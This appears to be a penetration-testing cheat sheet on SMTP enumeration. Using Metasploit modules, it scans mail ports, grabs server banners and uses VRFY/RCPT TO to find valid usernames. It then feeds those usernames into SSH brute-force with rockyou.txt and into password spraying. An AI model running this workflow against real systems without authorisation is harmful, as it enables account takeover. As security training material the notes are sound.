## Overview

- **SMTP (Simple Mail Transfer Protocol)**: Used for sending email between servers.
- **Default Ports**:
  - `25/TCP` â€“ Traditional SMTP
  - `465/TCP` â€“ SMTPS (SMTP over SSL)
  - `587/TCP` â€“ Submission (used by mail clients with STARTTLS)
- Often reveals **valid usernames** â†’ useful for password spraying or SSH brute-force.

---
## Step-by-Step Workflow

### 1. Set Global Target

```msf
setg RHOSTS 192.168.1.10
setg RHOST 192.168.1.10
```

### 2. Confirm SMTP Is Running

```msf
use auxiliary/scanner/portscan/tcp
set PORTS 25,465,587
run
```

### 3. Enumerate SMTP Version

```msf
use auxiliary/scanner/smtp/smtp_version
run
```

â†’ Returns banner like:  
`220 mail.target.com ESMTP Postfix`

> ðŸ’¡ Helps identify mail server software (Postfix, Exim, Microsoft Exchange).

---
### 4. Enumerate Valid Usernames

```msf
use auxiliary/scanner/smtp/smtp_enum
set USER_FILE /usr/share/seclists/Usernames/top-usernames-shortlist.txt
run
```

â†’ This module uses `VRFY` or `RCPT TO` commands to test if usernames exist.

âœ… Example output:
```
[+] 192.168.1.10:25 - Found user: admin
[+] 192.168.1.10:25 - Found user: john
[+] 192.168.1.10:25 - Found user: support
```

> âš ï¸ Many modern mail servers **disable VRFY** for security â€” enumeration may fail silently.

---
### 5. Leverage Users for Further Attacks

Use discovered usernames in:

- **SSH brute-force**:
  ```msf
  use auxiliary/scanner/ssh/ssh_login
  set USER_FILE smtp_users.txt
  set PASS_FILE rockyou.txt
  run
  ```
  
- **Password spraying** against web logins, SMB, etc.

---
### Key Notes

- SMTP itself **does not grant shell access** â€” itâ€™s an **intelligence source**.
- Always check for **open relay** misconfigurations (rare today):

  ```msf
  use auxiliary/scanner/smtp/smtp_open_relay
  ```
  
- Combine with **other services**: valid email users often reuse passwords elsewhere.

> âœ… SMTP enumeration = low-hanging fruit for initial foothold via credential reuse.